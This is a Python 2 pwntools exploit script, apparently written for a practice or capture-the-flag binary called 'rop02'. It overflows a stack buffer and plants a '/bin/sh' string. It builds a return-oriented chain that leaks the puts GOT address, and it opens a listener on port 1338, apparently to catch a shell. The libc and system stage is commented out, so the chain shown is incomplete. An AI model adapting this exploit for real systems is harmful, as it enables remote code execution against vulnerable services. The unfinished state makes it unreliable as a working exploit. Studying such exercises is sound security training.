#!/usr/bin/env python2
# encoding: utf-8

from pwn import *

LOCAL = "remote" not in sys.argv

elf = ELF("./rop02")

context.update(binary=elf)
context(log_level='debug')

if LOCAL:
    libc = elf.libc
    r = process(elf.path)
else:
    libc = ELF("libc.so")
    r = remote("localhost", 1337)

l = listen(1338)

def debug(cmd=''):
    if "gdb" in sys.argv:
        context.terminal=["tmux",'splitw','-v','-h','-l','100']
        pie_base, glibc_base = r.libs()[elf.path], r.libs()[libc.path]
        gdb.attach(r.proc.pid, cmd + """\nc""")
    elif "strace" in sys.argv:
        run_in_new_terminal("strace -ff -p %d" % r.proc.pid)


debug('b *0x0000000000400849')
# pack/unpack with p32/u32/p64/u64 (pad to 4 or 8 bytes)
#leak = u64(r.readuntil('\n', drop=True)[:8].ljust(8, '\x00'))
#libc.address = leak - libc.symbols['__libc_start_main']
#system=libc.address +libc.symbols['system']
#log.success('libc @ %#x' % system)

r.recvuntil("What is your name?\n> ")
pay=flat(
        "/bin/sh\00",
        endianness='little',word_size=64,sign=False)
r.sendline(pay)


r.recvuntil("What is your quest?\n> ")
r.sendline("B"*100)

payload_leak=flat(

        "A"*112,    #buffer overflow
        "B"*8,     #stack frame

        0x00000000004008d3, #pop rdi ; ret
        elf.got['puts'],
        elf.plt['puts'],

        0x00000000004008d3, #pop rdi ; ret
        elf.symbols['answer1'],

        #again
        #0x0000000000400839,
        endianness='little',word_size=64,sign=False
        )



r.recvuntil("What is the air-speed velocity of an unladen swallow?\n> ")
r.sendline(payload_leak)



l.interactive()

